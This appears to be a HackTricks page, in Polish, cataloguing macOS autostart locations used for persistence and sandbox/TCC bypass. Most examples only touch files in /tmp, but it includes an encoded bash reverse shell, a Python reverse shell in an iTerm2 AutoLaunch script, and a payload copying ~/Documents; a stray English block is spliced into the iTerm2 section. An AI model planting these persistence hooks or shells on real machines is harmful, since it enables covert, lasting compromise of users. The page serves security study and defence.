# Automatyczne uruchamianie w macOS

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

Ta sekcja opiera się głównie na serii blogów [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), celem jest dodanie **więcej lokalizacji autostartu** (jeśli to możliwe), wskazanie **które techniki wciąż działają** obecnie z najnowszą wersją macOS (13.4) oraz określenie **uprawnień** wymaganych.

## Ominięcie piaskownicy

{% hint style="success" %}
Tutaj znajdziesz lokalizacje startowe przydatne do **ominięcia piaskownicy**, które pozwalają po prostu uruchomić coś, **zapisując to do pliku** i **czekając** na bardzo **powszechne** **działanie**, określoną **ilość czasu** lub **działanie, które zazwyczaj można wykonać** z wnętrza piaskownicy bez konieczności posiadania uprawnień root.
{% endhint %}

### Launchd

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

* **`/Library/LaunchAgents`**
* **Wywołanie**: Restart
* Wymagane uprawnienia root
* **`/Library/LaunchDaemons`**
* **Wywołanie**: Restart
* Wymagane uprawnienia root
* **`/System/Library/LaunchAgents`**
* **Wywołanie**: Restart
* Wymagane uprawnienia root
* **`/System/Library/LaunchDaemons`**
* **Wywołanie**: Restart
* Wymagane uprawnienia root
* **`~/Library/LaunchAgents`**
* **Wywołanie**: Ponowne logowanie
* **`~/Library/LaunchDemons`**
* **Wywołanie**: Ponowne logowanie

#### Opis i Wykorzystanie

**`launchd`** to **pierwszy** **proces** uruchamiany przez jądro OX S podczas uruchamiania i ostatni, który kończy działanie podczas wyłączania. Zawsze powinien mieć **PID 1**. Ten proces będzie **czytał i wykonywał** konfiguracje wskazane w **plikach ASEP** w:

* `/Library/LaunchAgents`: Agenci dla użytkownika zainstalowani przez administratora
* `/Library/LaunchDaemons`: Demony systemowe zainstalowane przez administratora
* `/System/Library/LaunchAgents`: Agenci dla użytkownika dostarczeni przez Apple.
* `/System/Library/LaunchDaemons`: Demony systemowe dostarczone przez Apple.

Gdy użytkownik loguje się, pliki plist znajdujące się w `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` są uruchamiane z **uprawnieniami zalogowanego użytkownika**.

**Główną różnicą między agentami a demonami jest to, że agenci są ładowani podczas logowania użytkownika, a demony są ładowane podczas uruchamiania systemu** (ponieważ istnieją usługi, takie jak ssh, które muszą być uruchomione przed dostępem jakiegokolwiek użytkownika do systemu). Ponadto agenci mogą korzystać z interfejsu graficznego, podczas gdy demony muszą działać w tle.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Istnieją przypadki, w których **agent musi zostać uruchomiony przed zalogowaniem użytkownika**, nazywane **PreLoginAgents**. Na przykład jest to przydatne do zapewnienia technologii wspomagającej podczas logowania. Mogą one być również znalezione w `/Library/LaunchAgents` (zobacz [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).

{% hint style="info" %}
Nowe pliki konfiguracyjne Daemons lub Agents zostaną **załadowane po następnym ponownym uruchomieniu lub używając** `launchctl load <target.plist>`. Jest **również możliwe załadowanie plików .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak te pliki plist nie będą automatycznie ładowane po ponownym uruchomieniu).\
Możliwe jest również **odładowanie** za pomocą `launchctl unload <target.plist>` (proces wskazany przez niego zostanie zakończony).

Aby **upewnić się**, że nie ma **niczego** (jak nadpisanie), **co uniemożliwia uruchomienie** **Agent** lub **Daemon** **uruchom** polecenie: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Wypisz wszystkie agenty i demony załadowane przez bieżącego użytkownika:
```bash
launchctl list
```
{% hint style="warning" %}
Jeśli plik plist jest własnością użytkownika, nawet jeśli znajduje się w folderach systemowych demona, **zadanie będzie wykonywane jako użytkownik**, a nie jako root. Może to zapobiec niektórym atakom eskalacji uprawnień.
{% endhint %}

### pliki uruchamiania powłoki

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Ale musisz znaleźć aplikację z ominięciem TCC, która wykonuje powłokę, która ładuje te pliki

#### Lokalizacje

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Wywołanie**: Otwórz terminal z zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Wywołanie**: Otwórz terminal z zsh
* Wymagane uprawnienia roota
* **`~/.zlogout`**
* **Wywołanie**: Zamknij terminal z zsh
* **`/etc/zlogout`**
* **Wywołanie**: Zamknij terminal z zsh
* Wymagane uprawnienia roota
* Potencjalnie więcej w: **`man zsh`**
* **`~/.bashrc`**
* **Wywołanie**: Otwórz terminal z bash
* `/etc/profile` (nie działało)
* `~/.profile` (nie działało)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Wywołanie**: Oczekiwane wywołanie z xterm, ale **nie jest zainstalowany** i nawet po zainstalowaniu występuje ten błąd: xterm: `DISPLAY is not set`

#### Opis & Wykorzystanie

Podczas inicjowania środowiska powłoki, takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. Obecnie macOS używa `/bin/zsh` jako domyślnej powłoki. Ta powłoka jest automatycznie uruchamiana, gdy uruchamiana jest aplikacja Terminal lub gdy urządzenie jest dostępne za pośrednictwem SSH. Chociaż `bash` i `sh` są również obecne w macOS, muszą być jawnie wywoływane, aby być używane.

Strona man zsh, którą możemy przeczytać za pomocą **`man zsh`**, zawiera długie opisy plików startowych.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponownie otwarte aplikacje

{% hint style="danger" %}
Konfiguracja wskazanego wykorzystania i wylogowanie się, a następnie ponowne zalogowanie lub nawet ponowne uruchomienie nie zadziałało dla mnie, aby uruchomić aplikację. (Aplikacja nie była uruchamiana, być może musi być uruchomiona podczas wykonywania tych działań)
{% endhint %}

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Wywołanie**: Ponowne otwieranie aplikacji

#### Opis i Wykorzystanie

Wszystkie aplikacje do ponownego otwarcia znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Aby sprawić, żeby ponownie otwierane aplikacje uruchamiały Twoją własną, wystarczy **dodać swoją aplikację do listy**.

UUID można znaleźć, listując ten katalog lub za pomocą `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić aplikacje, które zostaną ponownie otwarte, można użyć polecenia:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Aby **dodać aplikację do tej listy**, możesz użyć:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferencje Terminala

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Terminal używa uprawnień FDA użytkownika, który go używa

#### Lokalizacja

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Wywołanie**: Otwórz Terminal

#### Opis i Wykorzystanie

W **`~/Library/Preferences`** przechowywane są preferencje użytkownika w Aplikacjach. Niektóre z tych preferencji mogą zawierać konfigurację do **wykonywania innych aplikacji/skryptów**.

Na przykład, Terminal może wykonać polecenie podczas uruchamiania:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w ten sposób:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Więc jeśli plik plist preferencji terminala w systemie mógłby zostać nadpisany, to funkcjonalność **`open`** może być użyta do **otwarcia terminala i wykonania tej komendy**.

Możesz dodać to z wiersza poleceń za pomocą:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Skrypty terminalowe / Inne rozszerzenia plików

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Terminal ma uprawnienia FDA użytkownika, jeśli go używa

#### Lokalizacja

* **W dowolnym miejscu**
* **Wywołanie**: Otwórz Terminal

#### Opis i Wykorzystanie

Jeśli utworzysz skrypt [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i go otworzysz, aplikacja **Terminal** zostanie automatycznie uruchomiona, aby wykonać polecenia w nim wskazane. Jeśli aplikacja Terminal ma specjalne uprawnienia (takie jak TCC), twoje polecenie zostanie wykonane z tymi specjalnymi uprawnieniami.

Wypróbuj to z:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Możesz również użyć rozszerzeń **`.command`**, **`.tool`**, z zwykłą zawartością skryptów powłoki i zostaną one również otwarte przez Terminal.

{% hint style="danger" %}
Jeśli terminal ma **Pełny dostęp do dysku**, będzie w stanie ukończyć tę akcję (zauważ, że wykonane polecenie będzie widoczne w oknie terminala).
{% endhint %}

### Wtyczki audio

Opis: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Opis: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

* **`/Library/Audio/Plug-Ins/HAL`**
* Wymagane uprawnienia roota
* **Wywołanie**: Zrestartuj coreaudiod lub komputer
* **`/Library/Audio/Plug-ins/Components`**
* Wymagane uprawnienia roota
* **Wywołanie**: Zrestartuj coreaudiod lub komputer
* **`~/Library/Audio/Plug-ins/Components`**
* **Wywołanie**: Zrestartuj coreaudiod lub komputer
* **`/System/Library/Components`**
* Wymagane uprawnienia roota
* **Wywołanie**: Zrestartuj coreaudiod lub komputer

#### Opis

Zgodnie z poprzednimi opisami możliwe jest **skompilowanie niektórych wtyczek audio** i ich załadowanie.

### Wtyczki QuickLook

Opis: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/NazwaAplikacjiTutaj/Contents/Library/QuickLook/`
* `~/Applications/NazwaAplikacjiTutaj/Contents/Library/QuickLook/`

#### Opis i Wykorzystanie

Wtyczki QuickLook mogą być uruchamiane, gdy **wywołasz podgląd pliku** (naciśnij spację przy wybranym pliku w Finderze) i zainstalowana jest **wtyczka obsługująca ten typ pliku**.

Możesz skompilować własną wtyczkę QuickLook, umieścić ją w jednej z powyższych lokalizacji, aby ją załadować, a następnie przejść do obsługiwanego pliku i nacisnąć spację, aby ją wywołać.

### ~~Haki logowania/wylogowania~~

{% hint style="danger" %}
To nie zadziałało dla mnie, ani z LoginHook użytkownika, ani z LogoutHook roota
{% endhint %}

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* Musisz móc wykonać coś w stylu `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Znajduje się w `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale mogą być używane do wykonywania poleceń po zalogowaniu użytkownika.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
To ustawienie jest przechowywane w `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Aby usunąć to:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Plik root użytkownika jest przechowywany w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Warunkowe obejście piaskownicy

{% hint style="success" %}
Tutaj znajdziesz lokalizacje startowe przydatne do **obejścia piaskownicy**, które pozwalają Ci po prostu uruchomić coś, **zapisując to do pliku** i **oczekując na nietypowe warunki** jak konkretne **zainstalowane programy, "nietypowe" działania użytkownika** lub środowiska.
{% endhint %}

### Cron

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Musisz jednak móc wykonać binarny `crontab`
* Lub być rootem
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Wymagany jest dostęp do zapisu roota. Brak wymagania roota, jeśli możesz wykonać `crontab <plik>`
* **Wywołanie**: Zależy od zadania cron

#### Opis i Wykorzystanie

Wyświetl listę zadań cron **bieżącego użytkownika** za pomocą:
```bash
crontab -l
```
Można również zobaczyć wszystkie zadania cron użytkowników w **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (wymaga uprawnień root).

W systemie MacOS można znaleźć kilka folderów wykonujących skrypty z **określoną częstotliwością** w:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
W tym miejscu znajdziesz regularne **zadania cron**, zadania **at** (rzadko używane) i zadania **periodic** (głównie używane do czyszczenia plików tymczasowych). Codzienne zadania periodic można wykonać na przykład za pomocą: `periodic daily`.

Aby dodać **zadanie cron użytkownika programistycznie**, można użyć:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Opis: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 wcześniej miało udzielone uprawnienia TCC

#### Lokalizacje

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Wywołanie**: Otwórz iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Wywołanie**: Otwórz iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Wywołanie**: Otwórz iTerm

#### Opis i Wykorzystanie

Skrypty przechowywane w **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zostaną wykonane. Na przykład:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### macOS Auto Start Locations

#### Launch Agents

Launch Agents are used to run processes when a user logs in. They are stored in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch Daemons are used to run processes at system boot or login. They are stored in `/Library/LaunchDaemons/`.

#### Login Items

Login Items are applications that open when a user logs in. They are managed in `System Preferences > Users & Groups > Login Items`.

#### Startup Items

Startup Items are legacy items that automatically launch when a user logs in. They are stored in `/Library/StartupItems/`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skrypt **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** zostanie również wykonany:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Preferencje iTerm2 znajdują się w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą **wskazywać polecenie do wykonania** po otwarciu terminala iTerm2.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

A polecenie jest odzwierciedlone w preferencjach:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Możesz ustawić polecenie do wykonania za pomocą:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Bardzo prawdopodobne, że istnieją **inne sposoby wykorzystania preferencji iTerm2** do wykonania dowolnych poleceń.
{% endhint %}

### xbar

Opis: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale xbar musi być zainstalowany
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Wymaga uprawnień dostępu do funkcji dostępności

#### Lokalizacja

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Wywołanie**: Po uruchomieniu xbar

#### Opis

Jeśli zainstalowany jest popularny program [**xbar**](https://github.com/matryer/xbar), można napisać skrypt powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale Hammerspoon musi być zainstalowany
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Wymaga uprawnień dostępu

#### Lokalizacja

* **`~/.hammerspoon/init.lua`**
* **Wywołanie**: Po uruchomieniu Hammerspoona

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) służy jako platforma automatyzacji dla **macOS**, wykorzystując język skryptowy **LUA** do swoich operacji. Warto zauważyć, że obsługuje integrację pełnego kodu AppleScript oraz wykonywanie skryptów powłoki, co znacząco zwiększa jego możliwości skryptowe.

Aplikacja szuka jednego pliku, `~/.hammerspoon/init.lua`, i po uruchomieniu zostanie wykonany skrypt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale BetterTouchTool musi być zainstalowany
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Wymaga uprawnień do Automatyzacji-Skrótów i Dostępności

#### Lokalizacja

* `~/Library/Application Support/BetterTouchTool/*`

To narzędzie pozwala wskazać aplikacje lub skrypty do wykonania po naciśnięciu określonych skrótów klawiszowych. Atakujący może skonfigurować własny **skrót i akcję do wykonania w bazie danych**, aby wykonać dowolny kod (skrót może polegać na po prostu naciśnięciu klawisza).

### Alfred

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale Alfred musi być zainstalowany
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* Wymaga uprawnień do Automatyzacji, Dostępności, a nawet dostępu do pełnego dysku

#### Lokalizacja

* `???`

Pozwala tworzyć przepływy pracy, które mogą wykonywać kod, gdy spełnione są określone warunki. Potencjalnie atakujący może stworzyć plik przepływu pracy i sprawić, aby Alfred go załadował (należy opłacić wersję premium, aby korzystać z przepływów pracy).

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale ssh musi być włączone i używane
* Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
* SSH ma dostęp do pełnego dysku

#### Lokalizacja

* **`~/.ssh/rc`**
* **Wywołanie**: Logowanie za pomocą ssh
* **`/etc/ssh/sshrc`**
* Wymagane uprawnienia roota
* **Wywołanie**: Logowanie za pomocą ssh

{% hint style="danger" %}
Aby włączyć ssh, wymagane jest uzyskanie dostępu do pełnego dysku:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Opis & Wykorzystanie

Domyślnie, chyba że `PermitUserRC no` w `/etc/ssh/sshd_config`, gdy użytkownik **loguje się przez SSH**, skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** zostaną wykonane.

### **Elementy logowania**

Opis: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale musisz wywołać `osascript` z argumentami
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Wywołanie:** Logowanie
* Payload eksploatacji przechowywany przy użyciu **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Wywołanie:** Logowanie
* Wymagane uprawnienia roota

#### Opis

W Preferencje systemowe -> Użytkownicy i grupy -> **Elementy logowania** można znaleźć **elementy do wykonania po zalogowaniu użytkownika**.\
Można je wyświetlić, dodać i usunąć z wiersza poleceń:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Te elementy są przechowywane w pliku **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Elementy logowania** mogą być również wskazane za pomocą interfejsu API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), który przechowa konfigurację w **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP jako element logowania

(Sprawdź poprzednią sekcję dotyczącą elementów logowania, to jest rozszerzenie)

Jeśli przechowasz plik **ZIP** jako **Element logowania**, **`Archive Utility`** go otworzy, a jeśli zip był na przykład przechowywany w **`~/Library`** i zawierał folder **`LaunchAgents/file.plist`** z tylnymi drzwiami, ten folder zostanie utworzony (nie jest to domyślne) i plist zostanie dodany, więc następnym razem, gdy użytkownik zaloguje się ponownie, **tylnie drzwi wskazane w pliku plist zostaną wykonane**.

Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu domowym użytkownika, więc jeśli folder LaunchAgents już istnieje, ta technika nadal będzie działać.

### At

Opis: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale musisz **wykonać** **`at`** i musi być **włączone**
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* Musisz **wykonać** **`at`** i musi być **włączone**

#### **Opis**

Zadania `at` są przeznaczone do **planowania zadań jednorazowych** do wykonania o określonych godzinach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Ważne jest zauważenie, że te zadania są trwałe po ponownym uruchomieniu systemu, co oznacza, że mogą stanowić potencjalne zagrożenie dla bezpieczeństwa w określonych warunkach.

Domyślnie są **wyłączone**, ale użytkownik **root** może je **włączyć** za pomocą:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
To spowoduje utworzenie pliku za 1 godzinę:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Sprawdź kolejkę zadań za pomocą `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
